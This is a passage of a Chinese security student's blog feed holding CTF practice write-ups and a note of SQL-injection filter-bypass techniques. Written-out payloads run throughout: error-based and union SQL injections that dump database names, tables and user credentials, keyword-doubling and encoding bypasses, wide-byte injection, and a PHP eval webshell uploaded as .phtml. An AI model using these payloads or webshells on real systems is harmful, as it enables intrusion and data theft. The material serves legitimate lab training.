2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0) * 2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p><p>结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！</p><hr><p>这个报错是很致命的，它会直接将我们所要查的数据库名字，字段的信息给报出来，这也就达到了我们注入的目的。  </p><h2 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h2><p>可以看到无论我们怎么输入，页面都只会显示两种界面<br>报错界面<br><a href="https://imgchr.com/i/yMoebQ"><img src="https://s3.ax1x.com/2021/02/03/yMoebQ.md.png" alt="yMoebQ.md.png"></a><br>you are in…界面<br><a href="https://imgchr.com/i/yMol80"><img src="https://s3.ax1x.com/2021/02/03/yMol80.md.png" alt="yMol80.md.png"></a><br>所以这道题我们选择报错注入——双查询注入。<br>构造以下payload：  </p><blockquote><p>?id=1’ and (select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a)–+</p></blockquote><p><a href="https://imgchr.com/i/yMoa5R"><img src="https://s3.ax1x.com/2021/02/03/yMoa5R.md.png" alt="yMoa5R.md.png"></a><br>却发现它说只能查一个字段（因为我们原本查询的是所有的结果，而现在只允许查一个字段），这里就要用到派生表的知识。  </p><blockquote><p>派生表是一个查询结果生成的表，类似于临时表。<br>派生表可以简化查询，避免使用临时表。相比手动生成临时性能更优越。派生表与其他表一样出现在查询的FROM子句中<br>select * from (select * from athors)  temp<br>temp 就是派生表</p></blockquote><p>所以我们构建一个这样的派生表，将我们的所有结果放到这个表里，然后查询一个字段。  </p><blockquote><p>?id=1’ and (select 1 from(select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a))–+</p></blockquote><p><a href="https://imgchr.com/i/yMo7qg"><img src="https://s3.ax1x.com/2021/02/03/yMo7qg.md.png" alt="yMo7qg.md.png"></a><br>发现又有新的要求：每个派生出来的表都必须有一个自己的别名，所以我们再给这个派生表起一个别名。  </p><blockquote><p>?id=1’ and (select 1 from(select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><img src="https://i.loli.net/2021/02/03/y12MCKTYIic6nEv.png" alt="8.png"><br>可以看到成功报错了，同时爆出来了当前使用的数据库，注意security1后面的1不是数据库名字中的，它是报错后加上的，并不在原本的数据库名字中。<br>接下来的操作就和以前的sql注入一样了。<br>查表名  </p><blockquote><p>?id=1’ and (select 1 from(select count( * ),concat((select group _concat(table _ name) from information _ schema.tables where table _  schema=’security’),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><img src="https://i.loli.net/2021/02/03/zZB4sNVOSGfryPe.png" alt="9.png"><br>爆字段  </p><blockquote><p>?id=1’ and (select 1 from(select count(* ),concat((select group_ concat(column_name) from information _ schema.columns where table _name=’users’),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><img src="https://i.loli.net/2021/02/03/ufLzkrc6saRJQ7x.png" alt="10.png"><br>但是等到我吗查询字段时又发生了问题。</p><blockquote><p>?id=1’ and (select 1 from(select count( * ),concat((select group_ concat(username) from security.users ),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><a href="https://imgchr.com/i/yMTFo9"><img src="https://s3.ax1x.com/2021/02/03/yMTFo9.md.png" alt="yMTFo9.md.png"></a><br>显示返回的字符超过了1行，导致返回报错，说明group_ concat在这里已经超出了它的长度限度，那么我们使用limit 0,1来一个一个的输出。  </p><blockquote><p>group_concat()函数的作用：将返回信息拼接成一行显示最多显示64个字符<br>limit 0,1  表示输出第一个数据。   0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个)</p></blockquote><p>这样构造payload。  </p><blockquote><p>?id=1’ and (select 1 from(select count( * ),concat((select username from security.users limit 0,1),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><a href="https://imgchr.com/i/yMTmQK"><img src="https://s3.ax1x.com/2021/02/03/yMTmQK.md.png" alt="yMTmQK.md.png"></a><br>通过改变0，1，2，3…..来一个个读取数据。<br>至此，sql的双查询注入就结束了。  </p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>这道题和第五关几乎一样，唯一不同的就是闭合方式不同，第五关是单引号闭合，这一关是双引号闭合。其余的语句都不变。</p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>双查询注入是报错注入的一种方法，报错注入就是利用了sql的语句的报错来获得数据库的信息，除了双查询注入外还有别的报错注入的方法，比如通过updatexml报错，通过ExtractValue报错 ，双查询注入利用的是通过floor报错，这三种方法本质相同，都是利用函数的报错。之后会把另外的报错注入方法总结一下。<br>关于双查询注入，其实还是有一些地方需要继续探究的，下面附上相关博客和双查询注入的格式。  </p><blockquote><p>and (select 1 from (select count(* ),concat(( <strong>payload</strong>),floor (rand(0) *2))x from information_schema.tables group by x)a) </p></blockquote><p><a href="https://www.cnblogs.com/BloodZero/p/4660971.html">双查询报错原因深究</a><br><a href="https://blog.csdn.net/lixiangminghate/article/details/80466257?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&spm=1001.2101.3001.4242">详细讲解双查询注入</a><br><a href="https://blog.csdn.net/qq_38196334/article/details/88644836?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161228375316780299083354%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161228375316780299083354&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-88644836.pc_search_result_cache&utm_term=count&spm=1018.2226.3001.4187">count（）函数的详解</a><br><a href="https://blog.csdn.net/qq_34987215/article/details/84145638?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161233565316780266270424%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161233565316780266270424&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-84145638.pc_search_result_cache&utm_term=sql%E6%B4%BE%E7%94%9F%E8%A1%A8&spm=1018.2226.3001.4187">SQL SERVER派生表</a></p>]]></content>
      
      
      <categories>
          
          <category> test25 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习17</title>
      <link href="test24/undefined-undefined.html"/>
      <url>test24/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天原本想写那道[HCTF 2018]admin题目的，但是看了半天还是写不出来，最后看了别人的wp也是懵懵懂懂，所以干脆再往后写一道算了。这道题的wp以后有时间再补吧。  </p><h1 id="极客大挑战-2019-BuyFlag-1"><a href="#极客大挑战-2019-BuyFlag-1" class="headerlink" title="[极客大挑战 2019]BuyFlag 1"></a>[极客大挑战 2019]BuyFlag 1</h1><p>打开题目，告诉我们要花一亿来买flag，而且还要输入正确的密码。<br><img src="https://i.loli.net/2021/02/02/AEOsXwfQeqRtoiW.png" alt="77.png"><br>直接先f12查看源码。<br><img src="https://i.loli.net/2021/02/02/i1YlVUHcsQXPDrE.png" alt="1.png"><br>源码中可以看到让我们用post的方式来上传我们的密码和钱。<br>其中从源码中可以看到密码不能是数字还要等于404。比较的两个等号说明这是一个弱类型比较。昨天刚刚遇到了这类比较，我们只需要在404后面输入非数字字符（比如说404abc）就可以绕过它的比较了。（原理可见昨天的博客）<br>那么直接开始在页面上使用插件来传参，却发现当输入password=404abc后传参发现页面没有发生变化，经过多次尝试后发现一直这样，那么我们只能抓包再传参了。<br>抓包后发现cookie中user这一信息为0，这显然是无法成功传参的，我们将它修改为1.<br><img src="https://i.loli.net/2021/02/02/jvaNYGfWyQzBbsV.png" alt="2.png"><br>然后注意修改传参方式为post（源码中特意提到传参方式）。最后输入密码和钱：passw=404abc&amp;money=100000000.<br><img src="https://i.loli.net/2021/02/02/xtgibGodeT1QuAO.png" alt="3.png"><br>发现失败了，原因是数字的长度太长，也就是说对money的字符长度做出了限制。这里有两种方法绕过这个限制。  </p><h3 id="一、科学计数法绕过"><a href="#一、科学计数法绕过" class="headerlink" title="一、科学计数法绕过"></a>一、科学计数法绕过</h3><p>因为要花一亿来买flag，但又不能直接输入一亿的数字，那么可以用科学计数法来代替直接输入，1e9就是电脑表示100000000的科学计数法，这样就不会导致字符太长而失败。  </p><h3 id="二、数组绕过"><a href="#二、数组绕过" class="headerlink" title="二、数组绕过"></a>二、数组绕过</h3><p>因为这里说字符串长度太长，所以猜测这里使用了strcmp（）函数。  </p><blockquote><p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p></blockquote><p>也就是说，只有当str2的长度等于str1的长度时，才能返回0。此外其实还有另一种方法能使其返回为0，那就是报错的时候（在php5.3版本之前）。<br>那么如何使其报错呢，当传入非字符串类型的的数据时，这个函数将发生错误此时将返回0。所以说我们可以传入一个money数组，这样就可以成功使函数报错，从而绕过钱的数额限制。  </p><blockquote><p>password=404abc&amp;money[]=10000  </p></blockquote><hr><p>这道题目主要还是绕过问题，包括弱类型绕过和一个新的函数的绕过。</p>]]></content>
      
      
      <categories>
          
          <category> test24 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入练习4</title>
      <link href="test23/undefined-undefined.html"/>
      <url>test23/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这关和前面的没有什么不同的。  </p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>这次后台的sql语句是这样的  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1”;</p></blockquote><p>那么结合上一关，我们只要在id=1后面加上”)就可以成功闭合。其余的步骤和之前的就一样了。<br>接下来爆库名  </p><blockquote><p>?id=1”) union select 1,2,database()–+</p></blockquote><p>爆表名</p><blockquote><p>?id=1”) union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段 </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> test23 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习16</title>
      <link href="test22/undefined-undefined.html"/>
      <url>test22/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天又是一道网站备份文件的题目。  </p><h1 id="ACTF2020-新生赛-BackupFile-1"><a href="#ACTF2020-新生赛-BackupFile-1" class="headerlink" title="[ACTF2020 新生赛]BackupFile 1"></a>[ACTF2020 新生赛]BackupFile 1</h1><p>这道题目比较简单，打开题目发现让我们找藏起来的文件，那么应该也就是让我们找到备份文件了。<br>前面我们刚知道备份文件的后缀和名称有很多，而这一题就需要我们使用工具来找到这个文件。<br>这里我使用的是dirsearch这个扫描工具（可以在网上搜索安装）。输入下面命令。  </p><blockquote><p>python dirsearch.py -u <a href="http://13e8bfaa-7a05-43ed-a368-d041ed8501f8.node3.buuoj.cn/">http://13e8bfaa-7a05-43ed-a368-d041ed8501f8.node3.buuoj.cn/</a> -e php<br><img src="https://i.loli.net/2021/02/01/TdFEwY4vZB1bPpX.png" alt="74.png"><br>这个命令需要在cmd中输入，要先进入这个工具所在的目录才能使用。<br>可以发现，这个网页的备份文件为/index.php.bak。<br><img src="https://i.loli.net/2021/02/01/XeuvY2aKsdbI95r.png" alt="75.png"><br>接着我们就可以打开这个文件，查看源码了。  </p></blockquote><p>可以看到源码还是很简单的，通过get方式传入参数赋给key变量，key只能是数字。还定义了一个字符串str，接着就是将key和str进行比较，注意这里是==。两个等号，是弱类型比较，只比较值而不比较变量类型，但是int类型和str类型是无法直接比较的，所以当比较时会将字符串的首串数字提出来，之后的省去，用这串数字来和int类型的变量进行比较。<br>所以说str在比较时所用的字符串也就是123，那么我们传参使key=123就可以了。<br>构造/?key=123就可以得到flag。<br><img src="https://i.loli.net/2021/02/01/SAanwxbRYk4G6Mf.png" alt="76.png"></p><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>关于备份文件也就这么多知识点了，这次还考了比较类型，强弱类型比较并不是很难，下面附上关于这方面的讲解。<br><a href="https://blog.csdn.net/Auuuuuuuu/article/details/79621635?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161217660316780271533658%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161217660316780271533658&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-79621635.pc_search_result_cache&utm_term=php+%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83&spm=1018.2226.3001.4187">php中的==和===比较</a></p>]]></content>
      
      
      <categories>
          
          <category> test22 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习15</title>
      <link href="test21/undefined-undefined.html"/>
      <url>test21/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>昨天出去聚会，所以没有写题，明天出去有事，所以今天赶快来一道题练练手。  </p><h1 id="ACTF2020-新生赛-Upload-1"><a href="#ACTF2020-新生赛-Upload-1" class="headerlink" title="[ACTF2020 新生赛]Upload 1"></a>[ACTF2020 新生赛]Upload 1</h1><p>打开题目，可以看到让莪们上传一个文件。很明显这是一道上传木马题。<br><img src="https://i.loli.net/2021/01/30/dIEukpm58owrJKx.png" alt="64.png"><br>直接上传我们的一句话木马。  </p><blockquote><?php @eval($_POST['cmd']) ?></blockquote><p>但是却报错了。<br><img src="https://i.loli.net/2021/01/30/WcBXrUzMyohpkPN.png" alt="69.png"><br>他让我们上传的文件要以jpg,png,gif结尾。而且这个是在上传之前就检查的。所以我们要先在上传之前将文件后缀名改为.jpg或者其他，这样就可以绕过开始的前端检查，进一步进行抓包来进行更多的修改。<br>上传完文件后，抓包查看信息。<br><img src="https://i.loli.net/2021/01/30/ZY9aQzgkHvxIKRX.png" alt="70.png"><br>发现我们的文件成功上传了，可以看出网站后端没有进行更多的内容的检测，但是从上一道上传问题我们可以知道，我们上传的文件最终要是php文件，否则无法执行我们的一句话代码，所以再改一下文件类型。  </p><blockquote><p>filename=”shell.php”</p></blockquote><p>但是被拦截了。<br><img src="https://i.loli.net/2021/01/30/DBp3hFE6q4Z2lnu.png" alt="71.png"><br>说明我们不能上传php文件。那我们就绕过这个后缀。换成phtml。<br><img src="https://i.loli.net/2021/01/30/23nOYk167lZSpcv.png" alt="72.png"><br>可以看到上传成功了。接着就是剑蚁连接这个网址，别忘了需要完整的网址。<br><img src="https://i.loli.net/2021/01/30/oneBQl8h6E2MqJA.png" alt="73.png"><br>在根目录可以找到flag。</p>]]></content>
      
      
      <categories>
          
          <category> test21 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql绕过方法笔记</title>
      <link href="note4/undefined-undefined.html"/>
      <url>note4/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>在网上找了不少sql绕过的总结，下面搬运一篇我觉得总结的最简单明了的笔记。  </p><h1 id="一、绕过空格（注释符-，-a0）"><a href="#一、绕过空格（注释符-，-a0）" class="headerlink" title="一、绕过空格（注释符/* */，%a0）"></a>一、绕过空格（注释符/* */，%a0）</h1><p>1.两个空格代替一个空格（双写）</p><p>2.%a0=空格</p><p>3.最基本的绕过方法，用注释替换空格：/<em>注释/</em></p><p>4.括号绕过空格</p><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：time based盲注：</p><blockquote><p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</p></blockquote><p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p><h1 id="二、引号绕过（使用十六进制）"><a href="#二、引号绕过（使用十六进制）" class="headerlink" title="二、引号绕过（使用十六进制）"></a>二、引号绕过（使用十六进制）</h1><p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p><p>几乎没有任何注入能过滤十六进制。</p><h1 id="三、逗号绕过（使用from或者offset）"><a href="#三、逗号绕过（使用from或者offset）" class="headerlink" title="三、逗号绕过（使用from或者offset）"></a>三、逗号绕过（使用from或者offset）</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p><p>例如：</p><p>使用from to：</p><blockquote><p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);</p></blockquote><p>使用join：</p><blockquote><p>union select 1,2<br>union select * from (select 1)a join (select 2)b</p></blockquote><p>使用like：</p><blockquote><p>select ascii(mid(user(),1,1))=80 #等价于<br>select user() like ‘r%’</p></blockquote><p>使用offset来绕过limit中的”，”：</p><blockquote><p>select * from news limit 0,1<br>select * from news limit 1 offset 0</p></blockquote><h1 id="四、比较符号（-lt-gt-）绕过"><a href="#四、比较符号（-lt-gt-）绕过" class="headerlink" title="四、比较符号（&lt;&gt;）绕过"></a>四、比较符号（&lt;&gt;）绕过</h1><p>过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本</p><p>盲注的时候如果无法使用比较操作符，可使用greatest()、least()。（前者返回最大值，后者返回最小值）</p><blockquote><p>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64<br>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</p></blockquote><p>使用between and：</p><p>between a and b：返回a，b之间的数据，不包含b。</p><h1 id="五、or-and-xor-not绕过"><a href="#五、or-and-xor-not绕过" class="headerlink" title="五、or and xor not绕过"></a>五、or and xor not绕过</h1><blockquote><p>and=&amp;&amp; ， or=|| ， xor=| ， not=!</p></blockquote><h1 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#六、绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="六、绕过注释符号（#，–(后面跟一个空格））过滤"></a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h1><blockquote><p>id=1’ union select 1,2,3||’1</p></blockquote><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><blockquote><p>id=1’ union select 1,2,’3</p></blockquote><h1 id="七、-绕过"><a href="#七、-绕过" class="headerlink" title="七、= 绕过"></a>七、= 绕过</h1><p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p><h1 id="八、绕过union，select，where等"><a href="#八、绕过union，select，where等" class="headerlink" title="八、绕过union，select，where等"></a>八、绕过union，select，where等</h1><h2 id="1-使用注释符绕过："><a href="#1-使用注释符绕过：" class="headerlink" title="1.使用注释符绕过："></a>1.使用注释符绕过：</h2><p>常用注释符：</p><blockquote><p>//，– , /**/, #, –+, – -, ; , %00 , –a</p></blockquote><p>用法：</p><blockquote><p>U/ * * / NION / * * / SE /* */LECT/ * */user，pwd from user</p></blockquote><h2 id="2-使用大小写绕过："><a href="#2-使用大小写绕过：" class="headerlink" title="2.使用大小写绕过："></a>2.使用大小写绕过：</h2><blockquote><p>id=-1’UnIoN/**/SeLeCT</p></blockquote><h2 id="3-内联注释绕过："><a href="#3-内联注释绕过：" class="headerlink" title="3.内联注释绕过："></a>3.内联注释绕过：</h2><blockquote><p>id=-1’/* !UnIoN* / SeLeCT 1,2,concat(/ * !tabl _ name * /) FrOM / * information _ schema* /.tables / * !WHERE * // * !TaBlE_ScHeMa*/ like database()#</p></blockquote><h2 id="4-双关键字绕过"><a href="#4-双关键字绕过" class="headerlink" title="4.双关键字绕过"></a>4.双关键字绕过</h2><p>若删除掉第一个匹配的union就能绕过：</p><blockquote><p>id=-1’UNIunionONSeLselectECT1,2,3–</p></blockquote><h2 id="5-使用URLencode，ascii编码，"><a href="#5-使用URLencode，ascii编码，" class="headerlink" title="5.使用URLencode，ascii编码，"></a>5.使用URLencode，ascii编码，</h2><blockquote><p>%53%45%4c%45%43%54(ascii)</p></blockquote><h2 id="6-函数或特殊符号"><a href="#6-函数或特殊符号" class="headerlink" title="6.函数或特殊符号"></a>6.函数或特殊符号</h2><p>例如：表示admin，oracle中可以用 ‘adm’||’in’ , mysql中可以用 concat(‘adm’,’in’); mssql中可以用：’adm’+’in’</p><h1 id="九、通用绕过（编码）"><a href="#九、通用绕过（编码）" class="headerlink" title="九、通用绕过（编码）"></a>九、通用绕过（编码）</h1><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p><p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p><h1 id="十、等价函数绕过（不同数据库）"><a href="#十、等价函数绕过（不同数据库）" class="headerlink" title="十、等价函数绕过（不同数据库）"></a>十、等价函数绕过（不同数据库）</h1><blockquote><p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@datadir ==&gt; datadir()  </p></blockquote><p>例如：substring()和substr()无法使用时：</p><blockquote><p>?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</p></blockquote><p>或者：</p><blockquote><p>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1</p></blockquote><h1 id="十一-宽字节注入"><a href="#十一-宽字节注入" class="headerlink" title="十一.宽字节注入"></a>十一.宽字节注入</h1><p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><p>（1）%df 吃掉 \ 具体的方法是 urlencode(’) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><blockquote><p>id=-1%df%27union select 1,user(),3–+</p></blockquote><p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><p>一般产生宽字节注入的PHP函数：</p><p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \ 转为 \，将 “ 转为 “ 。用思路一。</p><p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>3.mysql_real_escape_string()：转义下列字符：</p><p>\x00 \n \r \ ’ “ \x1a</p><p>（防御，将mysql设置为gbk即可）</p>]]></content>
      
      
      <categories>
          
          <category> note4 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习14</title>
      <link href="test20/undefined-undefined.html"/>
      <url>test20/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天是一道sql注入题目，复习一下sql注入。  </p><h1 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1"></a>[极客大挑战 2019]BabySQL 1</h1><p>打开题目，题目说加强了过滤，也就是说这次注入可能有些字符不能使用，首先还是尝试一下万能密码。  </p><blockquote><p>输入username=1’ or 1=1#</p></blockquote><p>发现报错。<br><img src="https://i.loli.net/2021/01/28/SAnK19xHeIiZcLt.png" alt="57.png"><br>可以看到报错显示的是’1=1#’ 附近出现问题，可以知道是or被过滤了，接着用联合查询查一下显示位。  </p><blockquote><p>username=1’ union select 1,2,3#</p></blockquote><p>发现同样报错。<br><img src="https://i.loli.net/2021/01/28/CGxZrIkzdcj2sXK.png" alt="58.png"><br>这里可以看到报错显示的是在’1,2,3#’附近，说明union和select也被过滤了，但是过滤的方式有很多，绕过也有很多方法，如果一个个绕过会很麻烦，比如过滤or可以使用||来绕过，也可以用别的方式绕过，这里我们使用双写绕过。  </p><hr><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>双写绕过是建立在使用replace（）函数过滤这个条件的，也就是识别出需要过滤的字符，然后将其替换为空。遇到这种情况时，我们可以进行双写来绕过。<br>比如输入un<strong>union</strong>ion，这时函数会检测到字符串中有union这个字符那么就会将它替换为空，去掉中间的union后最终我们仍旧会得到union来达到我们的目的。  </p><hr><p>那我们就先试一下。  </p><blockquote><p>输入username=1’ oorr 1=1# </p></blockquote><p><img src="https://i.loli.net/2021/01/28/1I5nzQJslpTfG6V.png" alt="59.png"><br>发现确实成功了，那么我们接下来的注入都可以这样进行。<br>查看回显位。  </p><blockquote><p>username=1’ ununionion seselectlect 1,2,3#</p></blockquote><p>发现2，3位有回显。<br><img src="https://i.loli.net/2021/01/28/AlVrHmGeIFsbyQZ.png" alt="60.png"><br>接着查看数据库名字。  </p><blockquote><p>1’ ununionion seselectlect 1,2,database()#</p></blockquote><p><img src="https://i.loli.net/2021/01/28/b5vJyfD6QEMaPHg.png" alt="61.png"><br>接下来的操作和前面的题目就差不多一样了，不过要注意的是再后面的注入中发现题目还过滤了where和from字符，这些都是要一个个试出来的。<br>比如输入1’ from#然后查看报错回显中有没有from字符，如果没有，就说明被过滤了，同样要使用双写来绕过。<br>此外当我们输入information时需要注意，information中同样含有or字符，所以这个地方也要局部进行双写。下面附上部分注入语句。  </p><blockquote><p>1’ ununionion seselectlect 1,(selselectect group _ concat(table _ name) frfromom infoorrmation_schema.tables whwhereere table _ schema=’geek’),database()#<br>查看表名</p></blockquote><p><img src="https://i.loli.net/2021/01/28/MgIbr84FCPxdJnA.png" alt="62.png"></p><blockquote><p>seselectlect group_ concat(column_name) frfromom infoorrmation _ schema.columns whwhereere table _name=’b4bsql’<br>查看b4bsql表中的字段。</p></blockquote><blockquote><p>seselectlect group_ concat(password) frfromom geek.b4bsql<br>查看字段信息，得到flag。  </p></blockquote><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道sql注入考查了简单的绕过，一般这种绕过只要平时的积累够多就可以应付，这和昨天的upload题目是一个道理。当使用双写绕过时要注意过滤是否和这道题replace（）函数一样替换成空，如果替换成其他字符的话双写绕过就没办法实现了。<br>下面给一些双写绕过的博客积累。<br><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161181620116780269834648%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161181620116780269834648&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-82995313.pc_search_result_before_js&utm_term=sql%E6%B3%A8%E5%85%A5replace()%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">sql注入绕过方法总结</a><br><a href="https://blog.csdn.net/weixin_43606134/article/details/109198964?ops_request_misc=&request_id=&biz_id=102&utm_term=sql%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-109198964.pc_search_result_before_js&spm=1018.2226.3001.4187">sql注入绕过技巧</a></p>]]></content>
      
      
      <categories>
          
          <category> test20 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习13</title>
      <link href="test19/undefined-undefined.html"/>
      <url>test19/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天来一个上传文件的题目。  </p><h1 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="[极客大挑战 2019]Upload 1"></a>[极客大挑战 2019]Upload 1</h1><p>打开题目，可以看到让我们上传一个文件，那么很明显这道题就是一道文件上传题目，也就是让我们上传一句话木马。<br><img src="https://i.loli.net/2021/01/27/fPF1B8SMHpbNOxs.png" alt="51.png"><br>我先写了一个一句话木马，保存在文本文档里。  </p><blockquote><?php @eval($_POST['cmd']) ?></blockquote><p>接着打开抓包工具，将我的一句话上传上去。<br><img src="https://i.loli.net/2021/01/27/5gdpqW2U6BnVLTh.png" alt="52.png"><br>果然被拦截了，它提醒我们文件不是image类型的，我们可以在左面文件信息中Content-Type一栏看到类型为text/plain。所以我们将其改一下就行了，我们改为image/jpg再次上交。<br>这次又给我们拦了下来。<br><img src="https://i.loli.net/2021/01/27/S2B3dy6zXPHIgtp.png" alt="53.png"><br>它说我们的一句话内容有&lt;?这个字符，这很明显涉及到了一句话的变形，也就是用其他的字符替代&lt;?。<br>这个在网上不难查到，我构造了以下一句话。  </p><blockquote><p>&lt; script language=”php”&gt;eval($_REQUEST[shell])</script ></p></blockquote><p>也就是说可以用script来代替<?，?>标签。<br>接下来它又提出了要求。<br><img src="https://i.loli.net/2021/01/27/6EscuY7ah3TRUOS.png" 